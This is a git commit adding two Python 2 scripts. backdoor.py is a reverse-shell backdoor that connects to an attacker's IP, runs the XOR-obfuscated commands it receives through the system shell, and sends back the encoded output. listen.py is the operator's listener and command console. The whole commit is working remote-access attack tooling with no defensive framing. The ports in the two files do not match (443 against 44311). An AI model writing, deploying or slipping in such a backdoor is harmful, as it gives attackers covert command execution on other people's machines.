0f11a872862e49a207d2caebac1e9933d1c2ea5b
Filip <toxicnull@gmail.com>
2017-02-23 08:07:28 -0800

    Add files via upload

---
+++ backdoor.py
@@ -0,0 +1,28 @@
+#!/usr/bin/python
+ 
+import socket,subprocess,sys
+ 
+RHOST = "192.168.0.8" # Attacking machine internal IP
+RPORT = 443 # Port has to be the same in listener
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((RHOST, RPORT))
+ 
+while True:
+     # recieve XOR encoded data from network socket
+     data = s.recv(1024)
+ 
+     # XOR the data again with a 'x41' to get back to normal data
+     en_data = bytearray(data)
+     for i in range(len(en_data)):
+       en_data[i] ^=0x41
+ 
+     # Execute the decoded data as a command.  The subprocess module is great because we can PIPE STDOUT/STDERR/STDIN to a variable
+     comm = subprocess.Popen(str(en_data), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+     STDOUT, STDERR = comm.communicate()
+ 
+     # Encode the output and send to RHOST
+     en_STDOUT = bytearray(STDOUT)
+     for i in range(len(en_STDOUT)):
+       en_STDOUT[i] ^=0x41
+     s.send(en_STDOUT)
+s.close()
---
+++ listen.py
@@ -0,0 +1,23 @@
+import socket 
+ 
+s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind(("0.0.0.0", 44311))
+s.listen(2)
+print "Listening on port 44311... "
+(client, (ip, port)) = s.accept()
+print " Received connection from : ", ip
+ 
+while True:
+ command = raw_input('~$ ')
+ encode = bytearray(command)
+ for i in range(len(encode)):
+   encode[i] ^=0x41
+ client.send(encode)
+ en_data=client.recv(2048)
+ decode = bytearray(en_data)
+ for i in range(len(decode)):
+   decode[i] ^=0x41
+ print decode
+ 
+client.close()
+s.close()
